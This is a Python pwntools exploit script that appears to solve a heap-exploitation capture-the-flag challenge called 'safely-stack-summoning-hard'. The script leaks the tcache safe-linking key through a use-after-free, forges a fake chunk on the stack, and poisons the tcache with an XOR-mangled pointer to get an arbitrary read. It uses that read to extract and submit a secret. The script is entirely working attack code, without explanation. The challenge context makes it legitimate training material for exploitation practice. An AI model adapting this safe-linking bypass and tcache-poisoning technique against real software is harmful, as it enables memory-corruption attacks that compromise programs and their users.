#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level = "error"

elf = context.binary = ELF("/challenge/safely-stack-summoning-hard")

def get_leak(io):
    data = io.recvuntil(b"[*]").decode()
    print(data)
    stack_leak = int(re.findall(r"0x[a-f\d]+",data)[0],16)
    pie_leak = int(re.findall(r"0x[a-f\d]+",data)[1],16)
    print(stack_leak,pie_leak)
    return io,stack_leak,pie_leak

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def read(io,index,size):
    payload = b"read " + str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def echo(io,index,offset):
    payload  = b"echo "+ str(index).encode() + b" " + str(offset).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def stack_free(io):
    io.sendline(b"stack_free")
    return io

def stack_scanf(io,data):
    payload = b"stack_scanf " + data
    io.sendline(payload)
    return io

def stack_malloc_win(io):
    io.sendline(b"stack_malloc_win")
    return io

def send_flag(io,secret):
    payload = b"send_flag " + secret
    io.sendline(payload)
    return io

def xor_num(n1,n2):
    return n1 ^ n2

def get_key(io):
    io = malloc(io,0,24)
    io = free(io,0)
    io = puts(io,0)
    print(io.recvuntil(b"Data: ").decode())
    key = int.from_bytes(io.recvline()[:-1][:5],"little")
    print(hex(key))
    io = malloc(io,0,24)
    return io,key

def main():
    rbp = 0x7ff123123123
    ret = rbp + 0x8
    secret_add = rbp - 0xa9
    input_ptr_add = rbp - 0x220
    stack_scanf_add = rbp - 0x1a0
    stack_free_add = rbp - 0x1a0 + 0x40
    fake_chunk_offset = stack_free_add - stack_scanf_add - 0x10
    offset = secret_add - stack_free_add
    d1 = stack_free_add - input_ptr_add
    d2 = secret_add - input_ptr_add
    io = process()
    io,key = get_key(io)
    payload = b"a" * fake_chunk_offset + p64(0) + p64(0x301)
    io = stack_scanf(io,payload)
    io = stack_free(io)
    io = malloc(io,0,0x2f8)
    io = malloc(io,1,0x2f8)
    io = free(io,0)
    io = free(io,1)
    io = puts(io,1)
    print(io.recvuntil(b"Data: ").decode())
    leak = int.from_bytes(io.recvline()[:-1][:8],"little") ^ key
    print(hex(leak))
    
    io = scanf(io,1,p64(xor_num(key, (leak - d1))))
    io = malloc(io,3,0x2f8)
    io = malloc(io,0,0x2f8)
    io = scanf(io,0,p64(leak - d1 + d2))
    io = puts(io,0)
    print(io.recvuntil(b"Data: ").decode())
    secret = io.recvline()[:-1]
    io = send_flag(io,secret)
    io = quit(io)
    io.interactive()
    
main()
